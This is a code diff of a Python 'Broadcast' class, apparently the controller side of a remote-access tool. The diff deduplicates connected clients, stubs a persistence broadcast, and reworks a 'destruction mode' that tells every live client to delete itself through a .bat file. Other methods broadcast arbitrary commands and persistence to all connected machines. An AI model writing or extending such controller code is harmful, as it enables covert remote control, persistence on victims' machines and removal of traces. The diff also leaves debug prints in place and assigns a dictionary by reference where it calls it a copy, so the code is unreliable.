@@ -35,31 +35,36 @@ class Broadcast:
         '''
         Allows you not to send the same modes multiple times on the same machine. 
         This method is very useful for the destroy mode and persistence mode. 
-        Once the test is finished it sends a list with all the sockets. 
+        Once the test is finished it sends a list with all the sockets.
+
+        It is useless, for example, to send the destroy mode twice on the same machine. 
         '''
-        pass
-
+        
         dict_sorts = {}
-#Handler.dict_conn[Handler.number_conn] = [Handler.number_conn,self.conn, self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3], False] #3 #True = Connexion is life 
+        already_dict = False
+        copy_dict_conn = Handler.dict_conn
+        
+        for key in copy_dict_conn.keys():
+            #print("\nFirst key-->", key)
+            #print("First Value -->", Handler.dict_conn[key] )
+            #if(key == 0): #if first iteration    
+            #    dict_sorts[key] = Handler.dict_conn[key]
+            
+            for key_of_dict_sorts in dict_sorts:
+                if(dict_sorts[key_of_dict_sorts][NB_TOKEN] == copy_dict_conn[key][NB_TOKEN]):
+                    already_dict = True
+                else:
+                    pass
+            
+            if not (already_dict) and copy_dict_conn[key][NB_ALIVE] : #Value already existing and now online
+                print("\n\n\nappend dict -->",key)
+                print("is onligne: ", copy_dict_conn[key][NB_ALIVE])
+                print("content: ", copy_dict_conn[key], "\n\n")
 
-        for key in Handler.dict_conn.keys():
-            
-            if(key == 0): #if first iteration
-                dict_sorts[key] = [key,Handler.dict_conn[key][NB_SOCKET], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]]
-                print("--------->>>>",dict_sorts[key])
-            
-            else:
-                
-                for key2 in dict_sorts.keys(): #if doublon not add in dict
-                    if(dict_sorts[key2][NB_IP] == Handler.dict_conn[key][NB_IP]):
-                        print("ip doublon:")
-                        print(dict_sorts[key2][0], "==", Handler.dict_conn[key][0])
-                
-                    else: #if not doublon add in dict:
-                        dict_sorts[key] = [key,Handler.dict_conn[key][NB_SOCKET], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]]
-            
-        print(dict_sorts)
-        print(len(dict_sorts))         
+                dict_sorts[key] = copy_dict_conn[key]
+
+            already_dict = False #reset 
+       
         return dict_sorts
     
     def executeCommand(self,cmd_list):
@@ -82,28 +87,43 @@ class Broadcast:
                 cmd += char
         
         self.broadcast_to_all_clients(cmd) #send command for all client
+    
+    def persistence_to_all_clients(self):
+        pass
 
     def destruction_for_all_clients(self):
         #Launches a process (.bat file) to delete the program and then exits the program. 
+        
+        print("\ndestruction_for_all_clients: \n\n\n")
+        dict_sorts = self.aSingleRunMod()
+        print(dict_sorts)
+        print(len(dict_sorts))
+
         printColor("information","\n[!] are you sure you want to run the destruction mode on all customers ? Once the destruction mode is activated, the clients will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")
 
         if(areYouSure()):
             request = "MOD_DESTRUCTION:broadcast"
             print("\n")
-            for key in Handler.dict_conn.keys():
-                if(Handler.dict_conn[key][NB_ALIVE]):
-                    if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request,False): 
-                        printColor("information","[-] Client number {} {}:{} was disconnected.".format(Handler.dict_conn[key][NB_SESSION], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]))
+        
+            for key in dict_sorts.keys():
+               
+                print("Key: ", key)
+                print("alive: ",dict_sorts[key][NB_ALIVE])
+
+                if(dict_sorts[key][NB_ALIVE]):
+                    if CheckConn().sendsafe(key, dict_sorts[key][NB_SOCKET], request,False): 
+                        printColor("information","[-] Client number {} {}:{} was disconnected.".format(dict_sorts[key][NB_SESSION], dict_sorts[key][NB_IP], dict_sorts[key][NB_PORT]))
                         
                         try:
-                            Handler.dict_conn[key][NB_SOCKET].close()
-                        except:
+                            dict_sorts[key][NB_SOCKET].close()
+                        except Exception as e:
+                            print(e)
                             pass
 
                         CheckConn().connexionIsDead(key) 
 
                     else:
-                        printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
+                        printColor("information","[+] The command could not be sent to: {}:{}".format(dict_sorts[key][NB_IP], dict_sorts[key][NB_PORT]))
                 else:
                     pass
         else:
@@ -120,9 +140,7 @@ class Broadcast:
         When it sends persistence to all clients, it does not send "MOD_ALL". 
         With the "broadcast" argument of MOD_PERSISTENCE, the client does not send a response. It simply executes the persistence. 
         '''
-
-        self.aSingleRunMod()
-        
+            
         request = ""
 
         if not(whitout_MOD_ALL): 
